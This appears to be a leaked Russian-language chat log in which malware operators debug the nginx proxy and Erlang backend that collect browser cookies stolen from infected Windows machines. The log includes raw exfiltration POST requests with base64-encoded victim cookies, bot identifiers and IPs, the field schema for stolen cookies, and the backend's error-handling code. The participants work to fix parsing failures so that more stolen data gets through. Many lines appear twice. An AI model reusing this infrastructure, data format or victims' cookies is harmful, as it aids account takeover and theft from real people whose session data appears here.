Timestamp	From	To	Message
2021-08-30 09:43:57.351558	defender	ttrr	всем привет
2021-08-30 09:43:57.354587	ttrr	defender	всем привет
2021-08-30 09:44:05.515608	defender	ttrr	вот для этого я и делал нджинк
2021-08-30 09:44:05.517492	ttrr	defender	вот для этого я и делал нджинк
2021-08-30 09:44:20.135624	defender	ttrr	но он как драйвер сказал не правильно проксировал
2021-08-30 09:44:20.137028	ttrr	defender	но он как драйвер сказал не правильно проксировал
2021-08-30 09:44:24.798175	defender	ttrr	сейчас я с этим разберусь
2021-08-30 09:44:24.799542	ttrr	defender	сейчас я с этим разберусь
2021-08-30 09:44:34.733816	defender	ttrr	+ сделаю только хттп1
2021-08-30 09:44:34.736161	ttrr	defender	+ сделаю только хттп1
2021-08-30 09:44:44.412265	ttrr	defender	+ логирование запросов и тела
2021-08-30 09:44:44.412572	defender	ttrr	+ логирование запросов и тела
2021-08-30 13:22:35.595018	defender	ttrr	сделал логирование
2021-08-30 13:22:35.598973	ttrr	defender	сделал логирование
2021-08-30 13:22:38.300807	defender	ttrr	/var/log/nginx/access.log
2021-08-30 13:22:38.302158	ttrr	defender	/var/log/nginx/access.log
2021-08-30 13:22:59.685575	defender	ttrr	все выводит что проходит через нджинкс
2021-08-30 13:22:59.689214	ttrr	defender	все выводит что проходит через нджинкс
2021-08-30 13:23:34.883851	defender	ttrr	выпилить хттп2 не так просто, надо собирать свой дистр
2021-08-30 13:23:34.902497	ttrr	defender	выпилить хттп2 не так просто, надо собирать свой дистр
2021-08-30 13:23:45.773037	defender	ttrr	давайте начнем пока с ищучения лога
2021-08-30 13:23:45.775229	ttrr	defender	давайте начнем пока с ищучения лога
2021-08-30 13:24:22.984035	defender	ttrr	если деро крашится значит нджинкс примет код не 200 и по нему можно увидеть какие там данные
2021-08-30 13:24:22.987302	ttrr	defender	если деро крашится значит нджинкс примет код не 200 и по нему можно увидеть какие там данные
2021-08-30 13:28:03.095285	defender	ttrr	да и если есть там реальный срач, давайте напишите мне регулярку по которой я отсеку в нджинксе все кроме норм запросов
2021-08-30 13:28:03.098557	ttrr	defender	да и если есть там реальный срач, давайте напишите мне регулярку по которой я отсеку в нджинксе все кроме норм запросов
2021-08-30 14:30:22.897053	defender	ttrr	все видят что я пишу?
2021-08-30 14:30:22.898304	ttrr	defender	все видят что я пишу?
2021-08-30 14:30:26.954072	defender	ttrr	смотрите?
2021-08-30 14:30:26.955301	ttrr	defender	смотрите?
2021-08-30 14:30:38.865911	ttrr	defender	Я вижу.
2021-08-30 14:31:11.735008	ttrr	defender	Я пока не понял как мне сообщение посмотреть и тело запроса.
\x16\x03\x03\x00\xC2\x01\x00\x00\xBE\x03\x03a,O\xBC\xF5\xC6\xCFw\x958\xE8\x15O@\xBD)\xC5\xD3\xCA\x81\xE2\xA7i\xAF\xCCg\xA9[6k_/\x00\x00&\xC0,\xC0+\xC00\xC0/\xC0$\xC0#\xC0(\xC0'\xC0
2021-08-30 14:31:31.400586	ttrr	defender	Вот такое есть, это бинарные данные?
2021-08-30 14:32:37.708285	defender	ttrr	вот есть так как ты написал
2021-08-30 14:32:37.709748	ttrr	defender	вот есть так как ты написал
2021-08-30 14:32:44.613632	defender	ttrr	в не понятной кодировке
2021-08-30 14:32:44.614318	ttrr	defender	в не понятной кодировке
2021-08-30 14:32:47.115748	defender	ttrr	а есть норм
2021-08-30 14:32:47.116615	ttrr	defender	а есть норм
2021-08-30 14:32:53.464012	defender	ttrr	200.58.180.138 -  [30/Aug/2021:17:31:45 +0300] "POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1" 403 182 "" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64
; Trident/7.0; .NET4.0E; .NET4.0C; InfoPath.3; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)" "-----------KRLRMIKEGVGXNTPQ\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nUtente2|Ch
rome|dGFncy5hZHNhZmV0eS5uZXQ=|RElE|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|1546590957|2147483641|Lw==\r\nUtente2|Chrome|dGFncy5hZHNhZmV0eS5uZXQ=|SURU|MTAw|1546590957|2147483641|Lw==\r\nUtente2|Chrom
e|dGFncy5hZHNhZmV0eS5uZXQ=|VUlE|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|1546590957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfZGlk|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|154659
0957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfaWR0|MTAw|1546590957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfdWlk|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|154659095
7|2147483641|Lw==\r\nUtente2|Chrome|dGFncy5hZHNhZmV0eS5uZXQ=|dg==|Mg==|1546590957|2147483641|Lw==\r\nUtente2|Chrome|Lmdvb2dsZS5jb20=|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218723|2146723192|Lw==\r\nUtente
2|Chrome|Lmdvb2dsZS5pdA==|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218724|2146723192|Lw==\r\nUtente2|Chrome|LnlvdXR1YmUuY29t|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218724|2146723192|Lw==\r\nUtente2|Chrome|Lm
ludGVudGlxLmNvbQ==|SVF2ZXI=|MS45|1562134121|1877494136|Lw==\r\nUtente2|Chrome|LmhvdGVscy5jb20=|X2Nsc192|MGE5ZTdlN2UtZGY1Mi00YWQzLWI0YjItY2UxZGI0MGQ1MWU5|1562134143|1719814143|Lw==\r\nUtente2|Chrome|LnRya
XZhZ28uY29t|Y3RpZA==|SzRETTU1bm1JMzdIQzVudXZUTXBveFhROU4=|1562134117|2147483643|Lw==\r\nUtente2|Chrome|d3d3LnRyaXZhZ28uaXQ=|ZnR2|JTdCJTIyZnR2JTIyJTNBJTIyMjAxOTA3MDMwNjA4NDAlMjIlMkMlMjJsdHYlMjIlM0ElMjIyMD
E5MDcwMzA2MDg0MCUyMiUyQyUyMmVwJTIyJTNBOTk5OSUyQyUyMmNudHYlMjIlM0ExJTJDJTIyY250YyUyMiUzQTElMkMlMjJjbnRjcyUyMiUzQTElMkMlMjJmZXAlMjIlM0E5OTk5JTJDJTIydmMlMjIlM0EwJTJDJTIyY3RsJTIyJTNBOTk5JTJDJTIyY3RmJTIyJTNBO
Tk5JTJDJTIyaXRlbSUyMiUzQTIzMTMxNjglMkMlMjJwYXRoJTIyJTNBNDU4MTclMkMlMjJwYXRoMiUyMiUzQW51bGwlN0Q=|1562134136|2147483644|Lw==\r\nUtente2|Chrome|Lnd3dy50cml2YWdvLml0|aW50ZW50X21lZGlhX3ByZWZz||1562134121|-210
1681175|Lw==\r\nUtente2|Chrome|ZHVzLnRyaXZhZ28uY29t|c0xhbmd1YWdlTG9jYWxl|VUs=|1562134117|2147483643|Lw==\r\nUtente2|Chrome|c2VjZGUudHJpdmFnby5jb20=|c0xhbmd1YWdlTG9jYWxl|VUs=|1562134120|2147483643|Lw==\r\
nUtente2|Chrome|LnRyaXZhZ28uY29t|dGlk|N2JXQjhlZzVSalZ1VUI2Rm1hOXFTMXZXSlQ=|1562134140|2147483643|Lw==\r\nUtente2|Chrome|LnRyaXZhZ28uaXQ=|dGlk|NGFBWHhYNldhaG5IWmhHRm1PVFRLNkpVYl8=|1562134117|2147483643|Lw
==\r\nUtente2|Chrome|LnRyaXZhZ28uY29t|dHJ2X3RpZA==|N2JXQjhlZzVSalZ1VUI2Rm1hOXFTMXZXSlQ=|1562134140|2147483643|Lw==\r\nUtente2|Chrome|LnRyaXZhZ28uaXQ=|dHJ2X3RpZA==|NGFBWHhYNldhaG5IWmhHRm1PVFRLNkpVYl8=|156

...
...........
2021-08-30 14:32:53.470023	ttrr	defender	200.58.180.138 -  [30/Aug/2021:17:31:45 +0300] "POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1" 403 182 "" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64
; Trident/7.0; .NET4.0E; .NET4.0C; InfoPath.3; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)" "-----------KRLRMIKEGVGXNTPQ\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nUtente2|Ch
rome|dGFncy5hZHNhZmV0eS5uZXQ=|RElE|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|1546590957|2147483641|Lw==\r\nUtente2|Chrome|dGFncy5hZHNhZmV0eS5uZXQ=|SURU|MTAw|1546590957|2147483641|Lw==\r\nUtente2|Chrom
e|dGFncy5hZHNhZmV0eS5uZXQ=|VUlE|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|1546590957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfZGlk|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|154659
0957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfaWR0|MTAw|1546590957|2147483641|Lw==\r\nUtente2|Chrome|LmFkc2FmZXR5Lm5ldA==|Y3RfdWlk|OTUxNTg3OGU0MjIzODM5YmQ4MjQxNzhjZTIwYTBjMDM=|154659095
7|2147483641|Lw==\r\nUtente2|Chrome|dGFncy5hZHNhZmV0eS5uZXQ=|dg==|Mg==|1546590957|2147483641|Lw==\r\nUtente2|Chrome|Lmdvb2dsZS5jb20=|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218723|2146723192|Lw==\r\nUtente
2|Chrome|Lmdvb2dsZS5pdA==|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218724|2146723192|Lw==\r\nUtente2|Chrome|LnlvdXR1YmUuY29t|Q09OU0VOVA==|WUVTK0lULml0K1YxMg==|1550218724|2146723192|Lw==\r\nUtente2|Chrome|Lm
ludGVudGlxLmNvbQ==|SVF2ZXI=|MS45|1562134121|1877494136|Lw==\r\nUtente2|Chrome|LmhvdGVscy5jb20=|X2Nsc192|MGE5ZTdlN2UtZGY1Mi00YWQzLWI0YjItY2UxZGI0MGQ1MWU5|1562134143|1719814143|Lw==\r\nUtente2|Chrome|LnRya
XZhZ28uY29t|Y3RpZA==|SzRETTU1bm1JMzdIQzVudXZUTXBveFhROU4=|1562134117|2147483643|Lw==\r\nUtente2|Chrome|d3d3LnRyaXZhZ28uaXQ=|ZnR2|JTdCJTIyZnR2JTIyJTNBJTIyMjAxOTA3MDMwNjA4NDAlMjIlMkMlMjJsdHYlMjIlM0ElMjIyMD
E5MDcwMzA2MDg0MCUyMiUyQyUyMmVwJTIyJTNBOTk5OSUyQyUyMmNudHYlMjIlM0ExJTJDJTIyY250YyUyMiUzQTElMkMlMjJjbnRjcyUyMiUzQTElMkMlMjJmZXAlMjIlM0E5OTk5JTJDJTIydmMlMjIlM0EwJTJDJTIyY3RsJTIyJTNBOTk5JTJDJTIyY3RmJTIyJTNBO
Tk5JTJDJTIyaXRlbSUyMiUzQTIzMTMxNjglMkMlMjJwYXRoJTIyJTNBNDU4MTclMkMlMjJwYXRoMiUyMiUzQW51bGwlN0Q=|1562134136|2147483644|Lw==\r\nUtente2|Chrome|Lnd3dy50cml2YWdvLml0|aW50ZW50X21lZGlhX3ByZWZz||1562134121|-210
1681175|Lw==\r\nUtente2|Chrome|ZHVzLnRyaXZhZ28uY29t|c0xhbmd1YWdlTG9jYWxl|VUs=|1562134117|2147483643|Lw==\r\nUtente2|Chrome|c2VjZGUudHJpdmFnby5jb20=|c0xhbmd1YWdlTG9jYWxl|VUs=|1562134120|2147483643|Lw==\r\
nUtente2|Chrome|LnRyaXZhZ28uY29t|dGlk|N2JXQjhlZzVSalZ1VUI2Rm1hOXFTMXZXSlQ=|1562134140|2147483643|Lw==\r\nUtente2|Chrome|LnRyaXZhZ28uaXQ=|dGlk|NGFBWHhYNldhaG5IWmhHRm1PVFRLNkpVYl8=|1562134117|2147483643|Lw
==\r\nUtente2|Chrome|LnRyaXZhZ28uY29t|dHJ2X3RpZA==|N2JXQjhlZzVSalZ1VUI2Rm1hOXFTMXZXSlQ=|1562134140|2147483643|Lw==\r\nUtente2|Chrome|LnRyaXZhZ28uaXQ=|dHJ2X3RpZA==|NGFBWHhYNldhaG5IWmhHRm1PVFRLNkpVYl8=|156

...
...........
2021-08-30 14:33:11.247644	defender	ttrr	хооооотя код 403
2021-08-30 14:33:11.250259	ttrr	defender	хооооотя код 403
2021-08-30 14:33:14.505420	defender	ttrr	почему
2021-08-30 14:33:14.509284	ttrr	defender	почему
2021-08-30 14:33:57.054343	defender	ttrr	zulas: давай разбираться
2021-08-30 14:33:57.055738	ttrr	defender	zulas: давай разбираться
2021-08-30 14:36:02.443816	ttrr	defender	POST /mor1/WIN-OQR8NN197GR_W639600.5B505F7FFC79B12CBB3622DF3CBB3B1C/84/ HTTP/1.1
2021-08-30 14:36:21.829127	ttrr	defender	это наш запрос, если не ошибаюсь это куки
2021-08-30 14:36:35.158722	ttrr	defender	zulas: поясни почему 403
2021-08-30 14:38:38.673000	defender	ttrr	buza: давай я тебе скину креды, может ты тоже посмотришь логи?
2021-08-30 14:38:38.674301	ttrr	defender	buza: давай я тебе скину креды, может ты тоже посмотришь логи?
2021-08-30 14:38:38.679421	ttrr	defender	В конце данные обрезаны
2021-08-30 14:38:49.483189	defender	ttrr	просто чувствую что гл=де то рядом ответ
2021-08-30 14:38:49.485148	ttrr	defender	просто чувствую что гл=де то рядом ответ
2021-08-30 14:38:54.993772	ttrr	defender	Это так скопировалось?
2021-08-30 14:39:04.022728	defender	ttrr	driver: это я обрезал, там дохрена
2021-08-30 14:39:04.024612	ttrr	defender	driver: это я обрезал, там дохрена
2021-08-30 14:39:24.309952	ttrr	defender	Ок
2021-08-30 14:39:40.411567	ttrr	defender	defender: в последний раз когда я этим занимался (еще будучи разработчиком того самого модуля который эти данные шлет), коды ошибки приходили от бэкенда в случае если ему данные не нравились
2021-08-30 14:40:13.905387	ttrr	defender	т.е. тут нужно указание от зуласа, начиная с какого смещения в этом запросе данные невалидны (по мнению парсящей их библиотеки)
2021-08-30 14:41:26.281242	defender	ttrr	так да, но пока он думает, можетт у тебя мысли будут
2021-08-30 14:41:26.282595	ttrr	defender	так да, но пока он думает, можетт у тебя мысли будут
2021-08-30 14:42:45.465443	ttrr	defender	403 Forbidden шлет во многих случаях .. самый общий это неверный URL .. потом всякие баны и т.п.
2021-08-30 14:43:27.699283	defender	ttrr	у тебя есть конкретный сервер с конкретной базой и софтом + логи
2021-08-30 14:43:27.700992	ttrr	defender	у тебя есть конкретный сервер с конкретной базой и софтом + логи
2021-08-30 14:43:31.444261	defender	ttrr	рзберись плиз
2021-08-30 14:43:31.445786	ttrr	defender	рзберись плиз
2021-08-30 14:43:35.528319	ttrr	defender	для 84 команды конкретно тут может быть что он ожидает данные формы .. multipart но там ничего нет
2021-08-30 14:43:54.454778	ttrr	defender	я сваливаю сейчас . смогу только завтра . так что сорян
2021-08-30 14:44:08.984350	defender	ttrr	кто в жабе кодер модуля?
2021-08-30 14:44:08.985609	ttrr	defender	кто в жабе кодер модуля?
2021-08-30 14:44:21.701708	defender	ttrr	надо добавить его сюда
2021-08-30 14:44:21.703657	ttrr	defender	надо добавить его сюда
2021-08-30 14:44:40.863464	defender	ttrr	zulas: утром?
2021-08-30 14:44:40.865232	ttrr	defender	zulas: утром?
2021-08-30 14:45:04.424764	ttrr	defender	ога
2021-08-30 14:45:04.864845	defender	ttrr	чтобы сюда кодера модуля подтянуть к этому времени
2021-08-30 14:45:04.865980	ttrr	defender	чтобы сюда кодера модуля подтянуть к этому времени
2021-08-30 14:46:32.016234	ttrr	defender	еще надо в лог писать длину пост данных .. потому что у меня лимит 64 кб
2021-08-30 14:46:43.414760	ttrr	defender	[19:43:23] <dgh> Там надо посмотреть весь лог, суть в том что должно быть по 8 полей 
[19:43:39] <dgh> И точно такую же ошибку нам выдавало когда их было больше или меньше 
[19:43:52] <dgh> И возвращало типа что то Missmatch parametr count 
[19:43:55] <dgh> В ответе
2021-08-30 14:46:48.423199	ttrr	defender	таймаут по чтению - 50 секунд
2021-08-30 14:46:58.654548	ttrr	defender	Это еще можно проверить
2021-08-30 14:48:08.519598	ttrr	defender	да .. надо логировать ответ сервера .. там 403 может быть с пояснением
2021-08-30 14:48:52.504786	ttrr	defender	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
такие колонки должны быть
2021-08-30 14:50:31.728438	ttrr	defender	у меня может в глазах двоится .. но я насчитал в запросе 15 колонов в пост-дата
2021-08-30 14:50:37.208069	ttrr	defender	колонок
2021-08-30 14:50:57.647931	ttrr	defender	Я по этому куску разбил по 8 везде
2021-08-30 14:51:05.432246	ttrr	defender	Или ты полный лог глядишь
2021-08-30 14:51:06.971204	ttrr	defender	?
2021-08-30 14:51:14.893244	ttrr	defender	хотя нет .. 8 )
2021-08-30 14:51:36.059121	ttrr	defender	То что в лимит уперлось кстати вероятно.
2021-08-30 14:51:39.705820	ttrr	defender	короче надо ответ сервера логировать . будет понятнее . .есть такая возможсность ? )
2021-08-30 14:51:39.738748	ttrr	defender	Тоже
2021-08-30 14:51:51.344087	ttrr	defender	и размер запроса
2021-08-30 14:52:13.543966	ttrr	defender	свалил )
2021-08-30 14:54:50.405321	ttrr	defender	сейчас автор модуля должен зайти
2021-08-30 15:09:35.351747	ttrr	defender	Готово
2021-08-30 15:15:06.289114	ttrr	defender	
» [ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
Разработчик админки ещё планирует 2 поля в конец добавить: Secure, HttpOnly
2021-08-30 15:18:47.857248	defender	ttrr	зулас будет      утром, надо вам с ним быть тут на связи, есть логи данных которые идут, они не проходят в бекенд, зулас скажет почему, и тут надо либо тебе либо ему править
2021-08-30 15:18:47.858527	ttrr	defender	зулас будет      утром, надо вам с ним быть тут на связи, есть логи данных которые идут, они не проходят в бекенд, зулас скажет почему, и тут надо либо тебе либо ему править
2021-08-30 19:40:45.766661	ttrr	defender	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-31 08:20:34.374781	ttrr	defender	ну и ?
2021-08-31 08:20:44.476293	ttrr	defender	одному мне больше всез надо ?
2021-08-31 08:21:25.224393	ttrr	defender	со вчера вечера что-то писали тут?
2021-08-31 08:23:54.168012	ttrr	defender	zulas: скинь еще раз кусок того POSTа, который был отвергнут бэком
2021-08-31 08:24:17.349591	ttrr	defender	А тут истории нет?
Писал по поводу новых полей в записи куки
2021-08-31 08:24:26.070879	ttrr	defender	нету истории
2021-08-31 08:26:45.180251	ttrr	defender	ну так на чем остановились?
2021-08-31 08:27:19.305071	ttrr	defender	я остановился на этом: вот был POST, с виду нормальный, бэк на него 403 сказал. Я попросил зуласа сказать что в нем не так
2021-08-31 08:27:38.955056	ttrr	defender	а я попросил расширить лог . чтобы логировало ответ
2021-08-31 08:27:51.220181	ttrr	defender	и размер запроса
2021-08-31 08:29:36.039814	ttrr	defender	а ты steller ?
2021-08-31 08:31:18.951385	ttrr	defender	Писал по поводу новых полей в записи куки
2021-08-31 08:33:03.544064	ttrr	defender	что именно?
2021-08-31 08:33:15.475971	ttrr	defender	403 встречалась раньше ошибка
-----------CJLVIYOINTQPMYSU
Content-Disposition: form-data; name="data"

user|Chrome|.google.com|ANID|	djEw171ep2SDF+UMAcWRRWBcsbp5H34/V0frREuTTKAE2F3BXw3fVVHhgYgcKidlSSPxtTs32WPiqcV/p021G67RLpNXgRDrMqljrJ16Ml1Ckwz2a2URAQ==|1588241125|1651313125|/
user|Chrome|.register.com|__utma|	djEwnpzEp2a3+eOKByaEj0nLtLL7HGvIusWq1obAuia9wTCz3pPEUF6A+gFpZ3LHPf2GSueVelCwgrXMR96kV8MmLcClokQ=|1588241143|1651313173|/

-----------CJLVIYOINTQPMYSU
Content-Disposition: form-data; name="source"

Chrome cookies
-----------CJLVIYOINTQPMYSU--

403
Mismatch parameters count!
2021-08-31 08:33:43.138232	ttrr	defender	zulas: сколько полей в куки у тебя сейчас?
steller: а у тебя?
2021-08-31 08:34:59.532730	ttrr	defender	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
2021-08-31 08:35:00.848581	ttrr	defender	вот поля
2021-08-31 08:35:14.267893	ttrr	defender	разделитель |
2021-08-31 08:35:28.661565	ttrr	defender	Разработчик админки планирует добавить 2 поля secure, httponly в конец записи.
Сейчас:
Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path
2021-08-31 08:35:46.673724	ttrr	defender	разделители строк: [ <<10>>, <<13,10>>]
2021-08-31 08:37:31.165104	ttrr	defender	403 была, когда некоторые поля не кодировались в В64. В отстойнике они безусловно декодировались.
2021-08-31 08:38:28.752644	ttrr	defender	А что по поводу максимального размера данных, он ограничен 64КБ будет?
2021-08-31 08:39:10.938323	ttrr	defender	{read_length, 64000},
{read_timeout, 50000}
я могу и больше сделать
2021-08-31 08:39:15.179160	ttrr	defender	таковы требоания были
2021-08-31 08:40:40.543070	ttrr	defender	50000 это в миллисекундах
2021-08-31 08:43:47.770055	ttrr	defender	В модуле нет такого ограничения. Можно разбить на несколько запросов, в принципе.
А какие ошибки отстойник может отдавать? Их желательно как-то обрабатывать.
403 добавил в обработку. На модуль приходили ещё 404 и 500. 500, видимо, от прокладки.
2021-08-31 08:45:02.926573	ttrr	defender	при успешном приеме и добавлении в базу dero всегда выдает 200 и /1/ ?
2021-08-31 08:45:20.941343	ttrr	defender	403 ошибка формата данных?
2021-08-31 08:45:42.352793	ttrr	defender	просо 200 бывает без /1/ ?
2021-08-31 08:45:46.770547	ttrr	defender	просто
2021-08-31 08:46:17.064232	ttrr	defender	zulas:
2021-08-31 08:47:07.169959	ttrr	defender	зачем этот /1/ ?
2021-08-31 08:47:10.015099	ttrr	defender	reply(not_found, Req) ->
 { ok, Req1 } = cowboy_req:reply(404, [], <<"Not found">>, Req),
 Req1;

reply(forbidden, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [], <<"Forbidden">>, Req),
 Req1;

reply(missing_data, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing data field!">>, Req),
 Req1;

reply(missing_keys, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing keys field!">>,  Req),
 Req1;

reply(missing_parameters, Req) ->
 {ok,Req1} = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Mismatch parameters count!">>,  Req),
 Req1;

reply(request_timeout, Req) ->
 {ok,Req1} = cowboy_req:reply(408, [{<<"Request Timeout">>, <<"text/plain">>}], <<"Request Timeout">>,  Req),
 Req1;
2021-08-31 08:47:16.137092	ttrr	defender	вот такие ошибки бывают
2021-08-31 08:47:22.016734	ttrr	defender	текст у вас отобразился ?
2021-08-31 08:47:31.375906	ttrr	defender	а то у меня пиджин -- и нифига
2021-08-31 08:47:40.868776	ttrr	defender	отразился
2021-08-31 08:48:11.907021	ttrr	defender	200 бывает без /1/ ?
2021-08-31 08:48:50.547354	ttrr	defender	по коду вроде не бывает
2021-08-31 08:48:57.441234	ttrr	defender	почуму спрашиваю - нужно ли в модуле проверять получение /1/ или достаточно получить статус 200 ?
2021-08-31 08:49:06.641955	ttrr	defender	[11:47:07] <hof> зачем этот /1/ ?
так по тз
2021-08-31 08:49:25.813162	ttrr	defender	это типа следующая команда для клиента
2021-08-31 08:49:29.556971	ttrr	defender	т.е. 200 без /1/ не бывает?
2021-08-31 08:49:55.929589	ttrr	defender	не бывает
2021-08-31 08:50:06.569346	ttrr	defender	ок, отлично
2021-08-31 08:50:53.719173	ttrr	defender	zulas: А сейчас логирование запросов http есть, их можно проверить?
2021-08-31 08:51:29.470308	ttrr	defender	есть
2021-08-31 08:52:48.116306	ttrr	defender	Скинь тогда проблемные запросы.
2021-08-31 08:58:25.519678	ttrr	defender	2021-08-31 11:52:22.415 [info] <0.6857.3> Data: <<"POST /tot57/WIN-U4U2CDE99LP_W617601.8C95D48B33FF1976677889D52ABB8859/84/ HTTP/1.0\r\nHost: 203.76.105.227\r\nX-Real-IP: 203.76.105.227\r\nX-Forwarded-For: 203.76.105.227\r\nConnection: close\r\nContent-Length: 11059\r\nAccept: */*\r\nContent-Type: multipart/form-data; boundary=---------MOBMWAMXGTKVMATK\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\r\nCache-Control: no-cache\r\n\r\n-----------MOBMWAMXGTKVMATK\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L2NvbXBsZXRlL3NlYXJjaA==\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L3NlYXJjaA==\r\nAdministrador|C...">>
 State: {state,#Port<0.108426>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[{'_',[],[{['...'],[],http_handler,[{limits,32768,1024,4096,102400,8529920,8388608,1024}]}]}]}],undefined,undefined,5,1,100,4096,64,4096,100,5000,1630399947415}
 ReqEmpty 0
2021-08-31 11:52:22.416 [critical] <0.6857.3>@http_handler:handle:33 Error {badmatch,false} [{base64,decode_binary,2,[{file,"base64.erl"},{line,212}]},{http_handler,'-save84/3-fun-4-',5,[{file,"src/http_handler.erl"},{line,329}]},{lists,foreach,2,[{file,"lists.erl"},{line,1338}]},{http_handler,save84,3,[{file,"src/http_handler.erl"},{line,325}]},{http_handler,handle,2,[{file,"src/http_handler.erl"},{line,30}]},{cowboy_handler,handler_handle,4,[{file,"src/cowboy_handler.erl"},{line,111}]},{cowboy_protocol,execute,4,[{file,"src/cowboy_protocol.erl"},{line,443}]}]
